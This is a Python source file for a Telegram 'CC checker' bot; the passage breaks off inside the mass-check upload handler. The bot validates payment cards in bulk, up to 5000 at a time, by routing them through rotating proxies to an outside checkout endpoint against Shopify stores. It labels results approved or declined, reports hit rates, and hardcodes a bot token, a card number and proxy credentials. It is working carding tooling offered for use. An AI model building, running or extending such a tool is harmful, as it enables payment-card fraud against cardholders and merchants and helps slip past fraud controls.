#!/usr/bin/env python3
"""
COMPLETE Telegram CC Checker Bot - FIXED GLOBAL VARIABLE ISSUE
python-telegram-bot v21.7
"""

import os
import sys
import json
import re
import time
import random
import asyncio
import logging
import datetime
import io
import concurrent.futures
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
    CallbackContext
)
from telegram.constants import ParseMode

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== CONFIGURATION ==========
BOT_TOKEN = "8504531890:AAEK6VbBgFICSeXT4aD_NJRQavQEM-kdz9Q"
OWNER_ID = 6821529235
API_BASE_URL = "https://signs2.onrender.com/autog"

# Bot settings
MAX_PROXIES = 20
MAX_MASS_CARDS = 5000
MAX_RETRIES = 3
REQUEST_TIMEOUT = 30

# ========== PATHS ==========
BASE_DIR = Path(__file__).parent
SITES_FILE = BASE_DIR / "sites.json"
PROXIES_FILE = BASE_DIR / "proxies.json"
STATS_FILE = BASE_DIR / "stats.json"
SCRIPTS_DIR = BASE_DIR / "scripts"

# ========== STATUS MAPPINGS ==========
status_emoji = {
    'APPROVED': '✅',
    'APPROVED_OTP': '✅',
    'DECLINED': '❌',
    'EXPIRED': '📅',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': 'APPROVED',
    'APPROVED_OTP': 'APPROVED OTP',
    'DECLINED': 'DECLINED',
    'EXPIRED': 'EXPIRED',
    'ERROR': 'ERROR'
}

# ========== LOGGING ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== DATA STORE CLASS ==========
class DataStore:
    """Centralized data store to manage global state"""
    def __init__(self):
        self.sites = []
        self.proxies = []
        self.stats = {
            "total_checks": 0,
            "approved": 0,
            "declined": 0,
            "expired": 0,
            "error": 0,
            "mass_checks": 0,
            "sites_count": 0,
            "proxies_count": 0
        }
        self.load_data()
    
    def load_data(self):
        """Load data from JSON files"""
        try:
            if SITES_FILE.exists():
                with open(SITES_FILE, 'r') as f:
                    loaded = json.load(f)
                    if isinstance(loaded, list):
                        self.sites = loaded
                    else:
                        self.sites = ["https://9marks.myshopify.com"]
            else:
                self.sites = ["https://9marks.myshopify.com"]
        except Exception as e:
            logger.error(f"Error loading sites: {e}")
            self.sites = ["https://9marks.myshopify.com"]
        
        try:
            if PROXIES_FILE.exists():
                with open(PROXIES_FILE, 'r') as f:
                    loaded = json.load(f)
                    if isinstance(loaded, list):
                        self.proxies = loaded
                        logger.info(f"✅ Loaded {len(self.proxies)} proxies from {PROXIES_FILE}")
                    else:
                        self.proxies = []
            else:
                self.proxies = []
        except Exception as e:
            logger.error(f"Error loading proxies: {e}")
            self.proxies = []
        
        try:
            if STATS_FILE.exists():
                with open(STATS_FILE, 'r') as f:
                    loaded_stats = json.load(f)
                    for key in self.stats:
                        if key in loaded_stats:
                            self.stats[key] = loaded_stats[key]
        except Exception as e:
            logger.error(f"Error loading stats: {e}")
        
        SCRIPTS_DIR.mkdir(exist_ok=True)
    
    def save_proxies(self):
        """Save proxies to file"""
        try:
            with open(PROXIES_FILE, 'w') as f:
                json.dump(self.proxies, f, indent=2)
            logger.info(f"💾 Saved {len(self.proxies)} proxies to {PROXIES_FILE}")
        except Exception as e:
            logger.error(f"Error saving proxies: {e}")
    
    def save_sites(self):
        """Save sites to file"""
        try:
            with open(SITES_FILE, 'w') as f:
                json.dump(self.sites, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving sites: {e}")
    
    def save_stats(self):
        """Save stats to file"""
        try:
            with open(STATS_FILE, 'w') as f:
                json.dump(self.stats, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving stats: {e}")
    
    def update_stats(self, status: str, mass_check: bool = False):
        """Update bot statistics"""
        self.stats["total_checks"] += 1
        if status == 'APPROVED' or status == 'APPROVED_OTP':
            self.stats["approved"] += 1
        elif status == 'DECLINED':
            self.stats["declined"] += 1
        elif status == 'EXPIRED':
            self.stats["expired"] += 1
        elif status == 'ERROR':
            self.stats["error"] += 1
        
        if mass_check:
            self.stats["mass_checks"] += 1
        
        self.stats["sites_count"] = len(self.sites)
        self.stats["proxies_count"] = len(self.proxies)
        
        self.save_stats()

# ========== GLOBAL DATA STORE ==========
# SINGLE global instance that all handlers will use
data_store = DataStore()

# Test CC for site testing
TEST_CC = "4263703530924474|06|2026|400"

# ========== HELPER FUNCTIONS ==========
def extract_cc(text: str) -> Optional[str]:
    """Extract CC from various formats"""
    text = ''.join(char for char in text if ord(char) < 128)
    
    patterns = [
        r'(\d{16})[|:/.\s]+(\d{1,2})[|:/.\s]+(\d{2,4})[|:/.\s]+(\d{3,4})',
        r'(\d{15})[|:/.\s]+(\d{1,2})[|:/.\s]+(\d{2,4})[|:/.\s]+(\d{3,4})',
        r'(\d{16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            groups = match.groups()
            cc = groups[0]
            mm = groups[1].zfill(2)
            yyyy = groups[2]
            
            if len(yyyy) == 2:
                yyyy = "20" + yyyy
            
            cvv = groups[3]
            return f"{cc}|{mm}|{yyyy}|{cvv}"
    
    return None

def extract_multiple_ccs(text: str) -> List[str]:
    """Extract multiple CCs from text"""
    ccs = []
    lines = text.split('\n')
    
    for line in lines:
        line = line.strip()
        if line:
            cc = extract_cc(line)
            if cc:
                ccs.append(cc)
    
    return ccs

def get_bin_info(card_number: str) -> Dict[str, str]:
    """Get BIN info from antipublic API"""
    bin_number = card_number[:6]
    try:
        response = requests.get(
            f"https://lookup.binlist.net/{bin_number}",
            headers={'Accept-Version': '3'},
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            return {
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "country_code": data.get("country", {}).get("alpha2", ""),
                "type": data.get("type", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "scheme": data.get("scheme", "Unknown")
            }
    except Exception as e:
        logger.error(f"Error fetching BIN info: {e}")
    
    return {
        "bank": "Unknown",
        "country": "Unknown",
        "country_code": "",
        "type": "Unknown",
        "brand": "Unknown",
        "scheme": "Unknown"
    }

def create_session_with_retries() -> requests.Session:
    """Create requests session with retry strategy"""
    session = requests.Session()
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def parse_proxy(proxy_str: str) -> Optional[Dict[str, str]]:
    """Parse proxy string into components"""
    try:
        proxy_str = proxy_str.strip()
        parts = proxy_str.split(':')
        if len(parts) != 4:
            return None
        
        host, port, username, password = parts
        
        if not port.isdigit():
            return None
        
        proxy_url = f"http://{username}:{password}@{host}:{port}"
        
        return {
            "host": host,
            "port": port,
            "username": username,
            "password": password,
            "url": proxy_url,
            "string": proxy_str
        }
    except Exception as e:
        logger.error(f"Error parsing proxy: {e}")
        return None

def get_concurrent_limit(proxy_count: int) -> int:
    """Calculate concurrent limit based on proxy count"""
    if proxy_count >= 15:
        return 15
    elif proxy_count >= 10:
        return 10
    elif proxy_count >= 5:
        return 5
    elif proxy_count >= 3:
        return 3
    elif proxy_count == 2:
        return 2
    elif proxy_count == 1:
        return 1
    return 0

def is_valid_response(response_text: str) -> bool:
    """Check if API response is valid"""
    if not response_text or not isinstance(response_text, str):
        return False
    
    if response_text.strip() == "":
        return False
    
    # Check if it's a JSON response from the API
    if response_text.startswith('{') and response_text.endswith('}'):
        return True
    
    # Check for actual error messages
    invalid_responses = [
        "proxy error",
        "connection failed",
        "bad gateway",
        "gateway timeout",
        "connection refused",
        "cannot connect",
        "timeout",
        "connect timeout",
        "connection error"
    ]
    
    response_lower = response_text.lower()
    for invalid in invalid_responses:
        if invalid in response_lower:
            return False
    
    return True

def process_response(api_response: str, price: float = 0.00) -> Tuple[str, str, str]:
    """Process API response and determine status"""
    if not api_response or not isinstance(api_response, str):
        return "NO RESPONSE", "ERROR", "$0.00"
    
    if not is_valid_response(api_response):
        return "INVALID RESPONSE", "ERROR", "$0.00"
    
    # Try to parse as JSON
    try:
        if api_response.startswith('{') and api_response.endswith('}'):
            data = json.loads(api_response)
            message = data.get('Message', '')
            status = data.get('Status', '')
            gateway = data.get('Gateway', 'Unknown')
            price_str = data.get('Price', '0.00')
            
            # Parse price from response
            try:
                price = float(price_str.replace('$', '').replace(',', ''))
            except:
                pass
            
            if status == 'APPROVED' or message == 'APPROVED':
                return message, 'APPROVED', f"${price:.2f}"
            elif 'DECLINED' in message.upper() or status == 'DECLINED':
                return message, 'DECLINED', f"${price:.2f}"
            elif 'EXPIRED' in message.upper():
                return message, 'EXPIRED', f"${price:.2f}"
            elif 'ERROR' in status.upper():
                return message, 'ERROR', f"${price:.2f}"
            else:
                return message, 'DECLINED', f"${price:.2f}"
    except:
        pass
    
    # Fallback to text-based processing
    response_upper = api_response.upper()
    
    if 'THANK YOU' in response_upper:
        return 'ORDER CONFIRM!', 'APPROVED', f"${price:.2f}"
    elif '3D' in response_upper:
        return 'OTP_REQUIRED', 'APPROVED_OTP', f"${price:.2f}"
    elif any(x in response_upper for x in ['EXPIRED_CARD', 'EXPIRE_CARD', 'EXPIRED']):
        return 'EXPIRE_CARD', 'EXPIRED', f"${price:.2f}"
    elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
        return api_response, 'APPROVED_OTP', f"${price:.2f}"
    elif 'CARD_DECLINED' in response_upper:
        return 'CARD_DECLINED', 'DECLINED', f"${price:.2f}"
    elif 'INCORRECT_NUMBER' in response_upper:
        return 'INCORRECT_NUMBER', 'DECLINED', f"${price:.2f}"
    elif 'FRAUD_SUSPECTED' in response_upper:
        return 'FRAUD_SUSPECTED', 'DECLINED', f"${price:.2f}"
    elif 'INVALID_TOKEN' in response_upper:
        return 'INVALID_TOKEN', 'DECLINED', f"${price:.2f}"
    elif 'AUTHENTICATION_ERROR' in response_upper:
        return 'AUTHENTICATION_ERROR', 'DECLINED', f"${price:.2f}"
    elif 'API_ERROR_402' in response_upper:
        return 'PAYMENT REQUIRED', 'DECLINED', f"${price:.2f}"
    elif 'API_ERROR_' in response_upper:
        return 'API ERROR', 'DECLINED', f"${price:.2f}"
    else:
        if any(x in response_upper for x in ['SUCCESS', 'APPROVED', 'APPROVE', 'OK']):
            return api_response, 'APPROVED', f"${price:.2f}"
        return api_response, 'DECLINED', f"${price:.2f}"

def test_proxy_with_api(proxy_dict: Dict[str, str], site_url: str) -> Tuple[bool, str, float]:
    """Test proxy with actual API call"""
    try:
        cc = TEST_CC
        api_url = f"{API_BASE_URL}?cc={cc}&site={site_url}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        
        proxy_config = {
            'http': proxy_dict['url'],
            'https': proxy_dict['url']
        }
        
        session = create_session_with_retries()
        start_time = time.time()
        
        response = session.get(
            api_url,
            headers=headers,
            proxies=proxy_config,
            timeout=REQUEST_TIMEOUT,
            verify=False
        )
        
        response_time = time.time() - start_time
        
        if response.status_code == 200:
            response_text = response.text.strip()
            logger.info(f"Proxy test response: {response_text[:100]}")
            
            # Proxy test SUCCESS if we get ANY valid response
            if is_valid_response(response_text):
                return True, response_text, response_time
            else:
                return False, response_text, response_time
        else:
            return False, f"HTTP {response.status_code}", response_time
        
    except requests.exceptions.ProxyError as e:
        logger.error(f"Proxy error: {e}")
        return False, f"Proxy Error: {str(e)}", 0.0
    except requests.exceptions.ConnectTimeout as e:
        logger.error(f"Connection timeout: {e}")
        return False, f"Connection Timeout: {str(e)}", 0.0
    except requests.exceptions.ConnectionError as e:
        logger.error(f"Connection error: {e}")
        return False, f"Connection Error: {str(e)}", 0.0
    except Exception as e:
        logger.error(f"Error in proxy test: {e}")
        return False, f"Error: {str(e)}", 0.0

def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, Any]:
    """Main check function with proxy"""
    result = {
        "success": False,
        "response": "",
        "status": "ERROR",
        "gateway": "",
        "price": 0.00,
        "response_time": 0.0,
        "proxy_status": "❌",
        "error": ""
    }
    
    try:
        api_url = f"{API_BASE_URL}?cc={cc}&site={site_url}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        }
        
        proxy_config = {
            'http': proxy_dict['url'],
            'https': proxy_dict['url']
        }
        
        session = create_session_with_retries()
        start_time = time.time()
        
        response = session.get(
            api_url,
            headers=headers,
            proxies=proxy_config,
            timeout=REQUEST_TIMEOUT,
            verify=False
        )
        
        response_time = time.time() - start_time
        
        if response.status_code == 200:
            response_text = response.text.strip()
            result["response"] = response_text
            result["response_time"] = response_time
            result["proxy_status"] = "✅"
            
            # Try to parse price from JSON response
            try:
                if response_text.startswith('{') and response_text.endswith('}'):
                    data = json.loads(response_text)
                    price_str = data.get('Price', '0.00')
                    if price_str:
                        result["price"] = float(price_str.replace('$', '').replace(',', ''))
            except:
                pass
            
            # Also try to get price from site URL
            if result["price"] == 0.00:
                price_match = re.search(r'[\$£€](\d+\.?\d*)', site_url)
                if price_match:
                    try:
                        result["price"] = float(price_match.group(1))
                    except:
                        result["price"] = 0.00
            
            processed_response, status, gateway = process_response(response_text, result["price"])
            result["response"] = processed_response[:100]
            result["status"] = status
            result["gateway"] = gateway if gateway else "Unknown"
            result["success"] = True if status != "ERROR" else False
        else:
            result["error"] = f"HTTP {response.status_code}"
            result["response"] = f"HTTP {response.status_code}"
            
    except requests.exceptions.ProxyError as e:
        result["error"] = f"Proxy Error: {str(e)}"
        result["response"] = "Proxy Error"
    except requests.exceptions.ConnectTimeout as e:
        result["error"] = f"Connection Timeout: {str(e)}"
        result["response"] = "Timeout"
    except requests.exceptions.ConnectionError as e:
        result["error"] = f"Connection Error: {str(e)}"
        result["response"] = "Connection Failed"
    except Exception as e:
        result["error"] = f"Error: {str(e)}"
        result["response"] = "System Error"
    
    return result

def format_message(cc: str, result: Dict[str, Any], bin_info: Dict[str, str], 
                   proxy_str: str, response_time: float, user_name: str) -> str:
    """Format result message"""
    parts = cc.split('|')
    card_number = parts[0] if len(parts) > 0 else ""
    
    if len(card_number) == 16:
        display_cc = f"{card_number[:4]}********{card_number[12:]}"
    else:
        display_cc = card_number
    
    if len(parts) == 4:
        formatted_cc = f"{display_cc}|{parts[1]}|{parts[2][-2:] if len(parts[2]) >= 2 else parts[2]}|{parts[3]}"
    else:
        formatted_cc = cc
    
    current_time = datetime.datetime.now().strftime("%H:%M:%S")
    proxy_parts = proxy_str.split(':')
    proxy_display = f"{proxy_parts[0]}:{proxy_parts[1]}" if len(proxy_parts) >= 2 else proxy_str
    
    emoji = status_emoji.get(result["status"], "⚠️")
    status_display = status_text.get(result["status"], result["status"])
    
    country_flag = ""
    if bin_info["country_code"]:
        try:
            code = bin_info["country_code"].upper()
            if len(code) == 2:
                flag_emoji = ''.join(chr(127397 + ord(c)) for c in code)
                country_flag = f" {flag_emoji}"
        except:
            pass
    
    if not country_flag and bin_info["country"]:
        country_flag = " 🇺🇸"
    
    message = f"""
┌─────────────────
│ {emoji} {status_display}
└─────────────────

💳 <b>Card:</b> <code>{formatted_cc}</code>
⚡ <b>Gateway:</b> {result.get('gateway', 'Unknown')}
📝 <b>Response:</b> <code>{result.get('response', 'No response')}</code>
─────────────────
🏦 <b>Issuer:</b> {bin_info.get('bank', 'Unknown')}
🌍 <b>Country:</b> {bin_info.get('country', 'Unknown')}{country_flag}
🔢 <b>Type:</b> {bin_info.get('brand', 'Unknown')} ({bin_info.get('type', 'Unknown')})
─────────────────
👤 <b>User:</b> {user_name}
⏱️ <b>Time:</b> {result.get('response_time', 0.0):.2f} seconds
🌐 <b>Proxy:</b> {proxy_display} {result.get('proxy_status', '❌')}
🕒 <b>Checked:</b> {current_time}
"""
    
    return message.strip()

def format_mass_message(total_cards: int, approved_count: int, declined_count: int, 
                        site: str, proxy_count: int) -> str:
    """Format mass check results message"""
    hit_rate = (approved_count / total_cards * 100) if total_cards > 0 else 0
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    message = f"""
┌─────────────────
│ 📊 MASS CHECK RESULTS
└─────────────────

<b>📁 Total Cards:</b> {total_cards}
<b>🔗 Site Used:</b> {site}
<b>🌐 Proxies Used:</b> {proxy_count}
<b>⚡ Concurrent Limit:</b> {concurrent_limit}

<b>✅ Approved:</b> {approved_count}
<b>❌ Declined:</b> {declined_count}

<b>🎯 Hit Rate:</b> {hit_rate:.1f}%
"""
    
    return message.strip()

# ========== COMMAND HANDLERS ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    user_name = user.first_name or "User"
    
    proxy_count = len(data_store.proxies)
    site_count = len(data_store.sites)
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    message = f"""
┌─────────────────
│ 💳 CC CHECKER BOT
└─────────────────

<b>Welcome {user_name}!</b>

<b>📊 Current Status:</b>
• 🌐 Proxies: {proxy_count} (REQUIRED)
• 🔗 Sites: {site_count}
• ⚡ Concurrent Limit: {concurrent_limit}

<b>⚠️ IMPORTANT:</b>
You must add proxies before checking!
More proxies = faster mass checking.

<b>📋 Commands:</b>

<b>🔍 Single Check:</b>
/chk CC|MM|YYYY|CVV
Reply to a message with CC

<b>📁 Mass Check:</b>
/mass - Send TXT file with CCs (max 5000)

<b>🌐 Proxy Management:</b>
/addproxy host:port:user:pass - Add proxy (max 20)
/listproxies - List all proxies
/clearproxies - Clear all proxies
/testproxy host:port:user:pass - Test a proxy

<b>🔧 Site Management:</b>
/addsite URL - Add single site
/listsites - List all sites

<b>📊 Stats:</b>
/stats - Bot statistics
"""
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command"""
    user = update.effective_user
    
    # Use the global data_store
    proxies_list = data_store.proxies
    sites_list = data_store.sites
    
    logger.info(f"chk_command: Checking {len(proxies_list)} proxies from data_store")
    
    if not proxies_list:
        await update.message.reply_text(
            "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
            "You must add at least 1 proxy before checking.\n"
            "Use: /addproxy host:port:username:password\n\n"
            "Example: /addproxy 216.10.27.159:6837:ggehzsqw:j6u1cagd9x19",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not sites_list:
        await update.message.reply_text("❌ No sites available. Use /addsite to add a site first.")
        return
    
    cc_text = None
    if context.args:
        cc_text = ' '.join(context.args)
    elif update.message.reply_to_message:
        cc_text = update.message.reply_to_message.text
    
    if not cc_text:
        await update.message.reply_text("❌ Invalid CC format. Use: /chk CC|MM|YYYY|CVV")
        return
    
    cc = extract_cc(cc_text)
    if not cc:
        await update.message.reply_text("❌ Invalid CC format. Use: /chk CC|MM|YYYY|CVV")
        return
    
    processing_msg = await update.message.reply_text("🔄 Checking card with proxy...")
    
    proxy_dict = random.choice(proxies_list)
    site = random.choice(sites_list)
    
    logger.info(f"chk_command: Using proxy: {proxy_dict['host']}:{proxy_dict['port']}")
    
    result = check_site(site, cc, proxy_dict)
    
    card_number = cc.split('|')[0]
    bin_info = get_bin_info(card_number)
    
    data_store.update_stats(result["status"], mass_check=False)
    
    user_name = user.first_name or user.username or "User"
    message = format_message(cc, result, bin_info, proxy_dict["string"], 
                            result["response_time"], user_name)
    
    await processing_msg.delete()
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mass command"""
    proxies_list = data_store.proxies
    sites_list = data_store.sites
    
    logger.info(f"mass_command: Proxies count: {len(proxies_list)}")
    
    if not proxies_list:
        await update.message.reply_text(
            "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
            "You must add at least 1 proxy before mass checking.\n"
            "Use: /addproxy host:port:username:password",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not sites_list:
        await update.message.reply_text("❌ No sites available. Use /addsite to add a site first.")
        return
    
    proxy_count = len(proxies_list)
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    message = (
        "📁 <b>Please send a TXT file with CCs (max 5000).</b>\n"
        "Format: CC|MM|YYYY|CVV each on new line.\n\n"
        f"🌐 <b>Proxies Available:</b> {proxy_count}\n"
        f"⚡ <b>Concurrent Limit:</b> {concurrent_limit} cards at once"
    )
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addproxy command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    proxy_str = ' '.join(context.args)
    
    # Use the global data_store
    proxies_list = data_store.proxies
    
    # Check if proxy already exists
    for proxy in proxies_list:
        if proxy["string"] == proxy_str:
            await update.message.reply_text("⚠️ Proxy already exists.")
            return
    
    if len(proxies_list) >= MAX_PROXIES:
        await update.message.reply_text(f"❌ Maximum {MAX_PROXIES} proxies allowed. Use /clearproxies to remove some.")
        return
    
    proxy_dict = parse_proxy(proxy_str)
    if not proxy_dict:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    test_msg = await update.message.reply_text("🔄 Testing proxy with API...")
    
    site = data_store.sites[0] if data_store.sites else "https://9marks.myshopify.com"
    success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
    
    # Consider ANY valid API response as success
    if success or (is_valid_response(response_text) and not "Proxy Error" in response_text):
        # Add to data_store
        proxies_list.append(proxy_dict)
        data_store.save_proxies()
        
        # Update proxies list in data_store
        data_store.proxies = proxies_list
        
        concurrent_limit = get_concurrent_limit(len(proxies_list))
        
        await test_msg.delete()
        await update.message.reply_text(
            f"✅ <b>Proxy added successfully!</b>\n\n"
            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
            f"<b>User:</b> {proxy_dict['username']}\n"
            f"<b>Status:</b> Working with API ✅\n\n"
            f"📊 <b>Proxies:</b> {len(proxies_list)}/{MAX_PROXIES}\n"
            f"⚡ <b>Concurrent Limit:</b> {concurrent_limit} cards\n\n"
            f"<i>More proxies = faster mass checking!</i>",
            parse_mode=ParseMode.HTML
        )
        
        # DEBUG: Show current state
        logger.info(f"addproxy_command: Added proxy. Total now: {len(data_store.proxies)}")
        logger.info(f"addproxy_command: Proxies in data_store: {[p['host'] for p in data_store.proxies]}")
    else:
        await test_msg.delete()
        await update.message.reply_text(
            f"❌ <b>Proxy Test Failed!</b>\n\n"
            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
            f"<b>Error:</b> {response_text}\n\n"
            "Check your proxy credentials and server.\n"
            "Make sure proxy is working with the checkout API.",
            parse_mode=ParseMode.HTML
        )

async def listproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listproxies command"""
    proxies_list = data_store.proxies
    
    logger.info(f"listproxies_command: Proxies count: {len(proxies_list)}")
    
    if not proxies_list:
        await update.message.reply_text("❌ No proxies available.")
        return
    
    message = "🌐 <b>Available Proxies:</b>\n\n"
    
    for i, proxy in enumerate(proxies_list, 1):
        message += f"{i}. <code>{proxy['host']}:{proxy['port']}</code>\n"
        message += f"   👤 {proxy['username']}\n"
    
    message += f"\n📊 Total: {len(proxies_list)}/{MAX_PROXIES}"
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def clearproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /clearproxies command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    proxies_list = data_store.proxies
    
    if not proxies_list:
        await update.message.reply_text("⚠️ No proxies to clear.")
        return
    
    count = len(proxies_list)
    data_store.proxies = []
    data_store.save_proxies()
    
    logger.info(f"clearproxies_command: Cleared {count} proxies")
    
    await update.message.reply_text(f"✅ Cleared {count} proxies.")

async def testproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /testproxy command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    proxy_str = ' '.join(context.args)
    proxy_dict = parse_proxy(proxy_str)
    
    if not proxy_dict:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    test_msg = await update.message.reply_text("🔄 Testing proxy with API call...")
    
    site = data_store.sites[0] if data_store.sites else "https://9marks.myshopify.com"
    success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
    
    # Show the actual API response
    if success or (is_valid_response(response_text) and not "Proxy Error" in response_text):
        try:
            if response_text.startswith('{') and response_text.endswith('}'):
                data = json.loads(response_text)
                status = data.get('Status', 'Unknown')
                message = data.get('Message', 'Unknown')
                gateway = data.get('Gateway', 'Unknown')
                price = data.get('Price', '0.00')
                
                await test_msg.delete()
                await update.message.reply_text(
                    f"✅ <b>Proxy Test Successful!</b>\n\n"
                    f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
                    f"<b>User:</b> {proxy_dict['username']}\n"
                    f"<b>Status:</b> Got API Response ✅\n\n"
                    f"<b>API Response:</b>\n"
                    f"• Status: {status}\n"
                    f"• Message: {message}\n"
                    f"• Gateway: {gateway}\n"
                    f"• Price: {price}\n"
                    f"• Response Time: {response_time:.2f}s\n\n"
                    "Use /addproxy to add this proxy to your list.",
                    parse_mode=ParseMode.HTML
                )
            else:
                await test_msg.delete()
                await update.message.reply_text(
                    f"✅ <b>Proxy Test Successful!</b>\n\n"
                    f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
                    f"<b>User:</b> {proxy_dict['username']}\n"
                    f"<b>Status:</b> Got Response ✅\n\n"
                    f"<b>Response:</b> {response_text[:200]}\n"
                    f"<b>Response Time:</b> {response_time:.2f}s\n\n"
                    "Use /addproxy to add this proxy to your list.",
                    parse_mode=ParseMode.HTML
                )
        except:
            await test_msg.delete()
            await update.message.reply_text(
                f"✅ <b>Proxy Test Successful!</b>\n\n"
                f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
                f"<b>User:</b> {proxy_dict['username']}\n"
                f"<b>Status:</b> Working with API ✅\n\n"
                "Use /addproxy to add this proxy to your list.",
                parse_mode=ParseMode.HTML
            )
    else:
        await test_msg.delete()
        await update.message.reply_text(
            f"❌ <b>Proxy Test Failed!</b>\n\n"
            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
            f"<b>Error:</b> {response_text}\n\n"
            "Proxy cannot connect to the checkout API.\n"
            "Check credentials and proxy server status.",
            parse_mode=ParseMode.HTML
        )

async def addsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addsite command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /addsite URL")
        return
    
    url = ' '.join(context.args).strip()
    
    if not url.startswith(('http://', 'https://')):
        await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://")
        return
    
    if url in data_store.sites:
        await update.message.reply_text("⚠️ Site already exists.")
        return
    
    data_store.sites.append(url)
    data_store.save_sites()
    
    await update.message.reply_text(f"✅ Site added: {url}")

async def listsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listsites command"""
    if not data_store.sites:
        await update.message.reply_text("❌ No sites available.")
        return
    
    message = "🔗 <b>Available Sites:</b>\n\n"
    
    for i, site in enumerate(data_store.sites, 1):
        message += f"{i}. {site}\n"
    
    message += f"\n📊 Total: {len(data_store.sites)}"
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats command"""
    proxy_count = len(data_store.proxies)
    site_count = len(data_store.sites)
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    total = data_store.stats["total_checks"]
    approved = data_store.stats["approved"]
    declined = data_store.stats["declined"]
    
    success_rate = (approved / total * 100) if total > 0 else 0
    
    message = f"""
┌─────────────────
│ 📊 BOT STATISTICS
└─────────────────

<b>🔢 Total Checks:</b> {total}
<b>✅ Approved:</b> {approved}
<b>🍳 Cooked:</b> {approved}
<b>❌ Declined:</b> {declined}

<b>📁 Mass Checks:</b> {data_store.stats["mass_checks"]}
<b>🌐 Total Proxies:</b> {proxy_count}/20
<b>⚡ Concurrent Limit:</b> {concurrent_limit}
<b>🔗 Total Sites:</b> {site_count}

<b>🎯 Success Rate:</b> {success_rate:.1f}%
"""
    
    await update.message.reply_text(message.strip(), parse_mode=ParseMode.HTML)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle TXT file upload for mass check"""
    if not data_store.proxies:
        await update.message.reply_text(
            "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
